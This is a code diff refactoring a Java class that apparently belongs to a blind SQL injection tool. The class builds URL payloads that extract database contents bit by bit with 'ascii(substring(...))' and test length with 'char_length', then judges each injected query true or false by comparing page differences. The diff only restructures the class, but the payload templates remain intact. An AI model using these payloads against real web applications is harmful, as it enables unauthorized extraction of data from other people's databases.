@@ -8,27 +8,7 @@ import java.util.List;
  * position and bit. Opcodes represents the differences between
  * the TRUE page, and the resulting page.
  */
-public class BlindCallable implements IBlindCallable {
-    /**
-     * The URL called.
-     */
-    private String blindUrl;
-    
-    /**
-     * Character position.
-     */
-    private int currentIndex;
-    
-    /**
-     * Bit searched.
-     */
-    private int currentBit;
-
-    /**
-     * Default call used for bit test.
-     */
-    private boolean isLengthTest = false;
-    
+public class BlindCallable extends AbstractBlindCallable {
     /**
      * List of differences found between the TRUE page, and the present page.
      */
@@ -38,7 +18,7 @@ public class BlindCallable implements IBlindCallable {
      * Constructor for preparation and blind confirmation.
      * @param urlTest
      */
-    BlindCallable(String urlTest) {
+    public BlindCallable(String urlTest) {
         this.blindUrl = "+and+" + urlTest + "--+";
     }
     
@@ -48,7 +28,7 @@ public class BlindCallable implements IBlindCallable {
      * @param indexCharacter
      * @param bit
      */
-    BlindCallable(String inj, int indexCharacter, int bit) {
+    public BlindCallable(String inj, int indexCharacter, int bit) {
         blindUrl = "+and+ascii(substring(" + inj + "," + indexCharacter + ",1))%26" + bit + "--+";
         this.currentIndex = indexCharacter;
         this.currentBit = bit;
@@ -60,7 +40,7 @@ public class BlindCallable implements IBlindCallable {
      * @param indexCharacter
      * @param isLengthTest
      */
-    BlindCallable(String newUrl, int indexCharacter, boolean isLengthTest) {
+    public BlindCallable(String newUrl, int indexCharacter, boolean isLengthTest) {
         this.blindUrl = "+and+char_length(" + newUrl + ")>" + indexCharacter + "--+";
         this.isLengthTest = isLengthTest;
     }
@@ -71,6 +51,7 @@ public class BlindCallable implements IBlindCallable {
      * in the pages from every FALSE SQL queries.
      * @return true if the current SQL query is true
      */
+    @Override
     public boolean isTrue() {
         for (diff_match_patch.Diff falseDiff: ConcreteBlindInjection.getConstantFalseMark()) {
             if (this.opcodes.contains(falseDiff)) {
@@ -93,19 +74,8 @@ public class BlindCallable implements IBlindCallable {
         return this;
     }
 
+    @Override
     public List<diff_match_patch.Diff> getOpcodes() {
         return this.opcodes;
-    }
-    
-    public boolean isLengthTest() {
-        return this.isLengthTest;
-    }
-    
-    public int getCurrentIndex() {
-        return this.currentIndex;
-    }
-    
-    public int getCurrentBit() {
-        return this.currentBit;
     }
 }
